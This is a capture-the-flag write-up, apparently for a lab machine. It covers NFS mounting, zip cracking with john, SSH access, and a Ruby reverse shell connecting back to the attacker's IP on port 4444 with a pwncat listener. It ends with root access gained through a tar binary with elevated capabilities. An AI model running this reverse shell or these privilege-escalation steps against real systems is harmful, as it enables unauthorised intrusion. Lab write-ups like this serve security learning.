first of all we run nmap to enumerate the machine:

	nmap -A 10.10.41.15

From the nmap we got around 6000 open ports but the machine suggets to connect on the port 1337 (meme from the older hacker)
after the connection to the previous port says that to 0 from 100th port there is a troll face with inside a message to connect 12345 thta it says
of the presence a NFS misconfigured so we exploit it:

	mkdir temporanea
	sudo mount -t nfs 10.10.41.15:/home/nfs temporanea
	ls -a ---> backup.zip		

it's time to use john:

	zip2john backup.zip > zip.hash
	john zip.hash

inside there is the hades home with the first flag and some ssh credentials, so it's time to find the ssh port

/for copyright we skip the python script to find the right ssh port/

the port is 3333, it's time to connect:

	ssh -i id_rsa hades@10.10.41.15 -p 3333

now we're inside the server in a ruby shell by googling aka chatGPT we find some command

	Dir.entries('.')
	IO.read('user.txt') you can also use File.read

after that, it ìs time to set a  revshell in order to have a comfy shell in pwncat

   on local host we started the listener:
	python3 -m pwncat
	connect -lp 4444

   on remote machine we copy and paste from revshell.com the revshell code
	require 'socket'
	spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.8.98.143",4444))

now it's time to privesc so we run linpeas.sh and it tells us that there is a binary with vulnerable capabilities (it means that it has root capabilites when executed)
	
	cd /tmp #you must be in a word writable directory to do that
	/bin/tar -cvf root.tar /root/ 

now we have the root directory compressed in tar format so we can extract the archive and get the root directory contents:
	
	tar xf root.tar

cd extracted root and we find the root.txt.

Powered By Alessandro Eleuteri & Alessandro Lupini 


